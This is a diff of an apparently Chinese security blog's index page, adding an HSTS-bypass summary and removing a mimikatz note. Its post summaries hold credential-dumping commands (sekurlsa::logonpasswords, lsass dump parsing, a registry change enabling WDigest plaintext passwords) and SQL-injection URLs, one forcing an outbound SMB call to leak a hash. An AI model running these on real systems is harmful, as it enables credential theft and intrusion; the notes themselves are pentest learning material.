@@ -118,6 +118,28 @@
 <!--  <div class="project-card">
   
   <div class="ctnWrap">
+    <a href="/2020/05/21/HSTS-bypassing/" class="title">HSTS bypassing</a>
+    <section class="desc">
+  HSTS：HTTP Strict Transport SecurityHSTS的作用是强制客户端（如浏览器）使用HTTPS与服务器创建连接。
+firefox+burp绕过方法：
+解决方法1：使用低版本firefox &lt; 3.6.25浏览器的旧版本无法与HSTS标头配合使用，因此会禁用HSTS强制实施
+解决方法2：导入burpsuit证书 
+
+解决方法3：忽略HSTS检查
+
+命名：test.currentTimeOffsetSecondsvalue：11491200
+清除history&amp;cache，然后重启浏览器
+
+
+
+</section>
+    <p class="sub">May 21, 2020</p>
+  </div>
+</div>-->
+<!---->
+<!--  <div class="project-card">
+  
+  <div class="ctnWrap">
     <a href="/2020/05/19/%E6%9F%90%E9%9D%A2%E8%AF%95%E5%81%9A%E9%A2%98%E8%AE%B0%E5%BD%95/" class="title">某面试做题记录</a>
     <section class="desc">
   目标IP：180.101.148.103
@@ -963,34 +985,6 @@ http://10.10.10.104/mvc/Product.aspx?ProductSubCategoryId=1;declare%20@q%20varch
   </div>
 </div>-->
 <!---->
-<!--  <div class="project-card">
-  
-  <div class="ctnWrap">
-    <a href="/2020/04/26/mimikatz%E6%8A%93%E5%8F%96%E5%AF%86%E7%A0%81%E5%B0%8F%E8%AE%B0/" class="title">mimikatz抓取密码小记</a>
-    <section class="desc">
-  1、直接抓取本机：
-[1]#privilege::debug          //提升权限[2]#sekurlsa::logonpasswords  //抓取密码
-离线破解lsass.dmp
-[1]dump lsass.dmp 回本地   //procudmp、dumpert、quarkspwdump等方法均可以dump下来
-[2]#privilege::debug          //提升权限
-[3]#sekurlsa::minidump C:\Users\Administrator\Downloads\mimikatz_trunk\x64\dumpert.dmp
-[4]#sekurlsa::logonpasswords  //抓取密码
-踩坑点：
-[1]报错1：getting error ERROR kuhl_m_sekurlsa_acquireLSA ; Handle on memory (0x00000002)相对路径报错    
-解决方法：lsass.dmp要给完整路径，
-[2]报错2：ERROR kuhl_m_sekurlsa_acquireLSA ; Key importmimikatz版本过低
-解决方法：使用2.0版本
-[3]报错3：ERROR kuhl_m_sekurlsa_acquireLSA ; Logon list
-windows 2012之后明文抓取均会出现这个报错
-需要修改注册表开启 WDigest，等待管理员登陆后再次读取，没有做额外防护就可以直接拿到明文了
-（mimikatz原理是读取内存中的密码，所以需要再次登录才能读取到）
-reg add HKLM\SYSTEM\CurrentControlSet\Control\SecurityProviders\WDigest /v UseLogonCredential /t REG_DWORD /d 1 /f
-
-</section>
-    <p class="sub">Apr 26, 2020</p>
-  </div>
-</div>-->
-<!---->
 <!--
   <nav class="pagination">
     <span class="page-number current">1</span><a class="page-number" href="/page/2/">2</a><a class="page-number" href="/page/3/">3</a><a class="extend next" rel="next" href="/page/2/">&lt;span class&#x3D;&quot;iconfont icon-arrow-right&quot;&gt;&lt;&#x2F;span&gt;</a>
@@ -1004,6 +998,43 @@ reg add HKLM\SYSTEM\CurrentControlSet\Control\SecurityProviders\WDigest /v UseLo
     <div class="box-content flex1">
         <div class="swiper-container">
             <div class="swiper-wrapper">
+                
+                    <a title="HSTS bypassing" alt="HSTS bypassing" href="/2020/05/21/HSTS-bypassing/"
+                       class="post-item swiper-slide flex flex-v">
+                        <div class="image">
+                            
+                                <img title="HSTS bypassing" alt="HSTS bypassing"
+                                     src="/images/default.jpg"></img>
+                            
+                        </div>
+                        <div class="content-warp flex1 flex flex-v">
+                            <div class="title">&lt; HSTS bypassing &gt;</div>
+                            <div class="content flex1">
+                                
+  HSTS：HTTP Strict Transport SecurityHSTS的作用是强制客户端（如浏览器）使用HTTPS与服务器创建连接。
+firefox+burp绕过方法：
+解决方法1：使用低版本firefox &lt; 3.6.25浏览器的旧版本无法与HSTS标头配合使用，因此会禁用HSTS强制实施
+解决方法2：导入burpsuit证书 
+
+解决方法3：忽略HSTS检查
+
+命名：test.currentTimeOffsetSecondsvalue：11491200
+清除history&amp;cache，然后重启浏览器
+
+
+
+
+                            </div>
+                            <div class="post-tags">
+                                
+                            </div>
+                            <div class="other">
+                                <!--<a><i class="iconfont icon-iconfontordinaryliulan"></i>52</a>-->
+                                <!--<a><i class="iconfont icon-icon27"></i>52</a>-->
+                                <span><i class="iconfont icon-shijian"></i>May 21, 2020</span>
+                            </div>
+                        </div>
+                    </a>
                 
                     <a title="某面试做题记录" alt="某面试做题记录" href="/2020/05/19/%E6%9F%90%E9%9D%A2%E8%AF%95%E5%81%9A%E9%A2%98%E8%AE%B0%E5%BD%95/"
                        class="post-item swiper-slide flex flex-v">
@@ -1974,49 +2005,6 @@ http://10.10.10.104/mvc/Product.aspx?ProductSubCategoryId=1; EXEC sp_configure &
 payload：
 http://10.10.10.104/mvc/Product.aspx?ProductSubCategoryId=1;declare%20@q%20varchar(99);set%20@q=%27\\10.10.14.14\test%27;%20exec%20master.dbo.xp_dirtree%20@q%20--%20-
 
-
-
-                            </div>
-                            <div class="post-tags">
-                                
-                            </div>
-                            <div class="other">
-                                <!--<a><i class="iconfont icon-iconfontordinaryliulan"></i>52</a>-->
-                                <!--<a><i class="iconfont icon-icon27"></i>52</a>-->
-                                <span><i class="iconfont icon-shijian"></i>Apr 26, 2020</span>
-                            </div>
-                        </div>
-                    </a>
-                
-                    <a title="mimikatz抓取密码小记" alt="mimikatz抓取密码小记" href="/2020/04/26/mimikatz%E6%8A%93%E5%8F%96%E5%AF%86%E7%A0%81%E5%B0%8F%E8%AE%B0/"
-                       class="post-item swiper-slide flex flex-v">
-                        <div class="image">
-                            
-                                <img title="mimikatz抓取密码小记" alt="mimikatz抓取密码小记"
-                                     src="/images/default.jpg"></img>
-                            
-                        </div>
-                        <div class="content-warp flex1 flex flex-v">
-                            <div class="title">&lt; mimikatz抓取密码小记 &gt;</div>
-                            <div class="content flex1">
-                                
-  1、直接抓取本机：
-[1]#privilege::debug          //提升权限[2]#sekurlsa::logonpasswords  //抓取密码
-离线破解lsass.dmp
-[1]dump lsass.dmp 回本地   //procudmp、dumpert、quarkspwdump等方法均可以dump下来
-[2]#privilege::debug          //提升权限
-[3]#sekurlsa::minidump C:\Users\Administrator\Downloads\mimikatz_trunk\x64\dumpert.dmp
-[4]#sekurlsa::logonpasswords  //抓取密码
-踩坑点：
-[1]报错1：getting error ERROR kuhl_m_sekurlsa_acquireLSA ; Handle on memory (0x00000002)相对路径报错    
-解决方法：lsass.dmp要给完整路径，
-[2]报错2：ERROR kuhl_m_sekurlsa_acquireLSA ; Key importmimikatz版本过低
-解决方法：使用2.0版本
-[3]报错3：ERROR kuhl_m_sekurlsa_acquireLSA ; Logon list
-windows 2012之后明文抓取均会出现这个报错
-需要修改注册表开启 WDigest，等待管理员登陆后再次读取，没有做额外防护就可以直接拿到明文了
-（mimikatz原理是读取内存中的密码，所以需要再次登录才能读取到）
-reg add HKLM\SYSTEM\CurrentControlSet\Control\SecurityProviders\WDigest /v UseLogonCredential /t REG_DWORD /d 1 /f
 
 
                             </div>
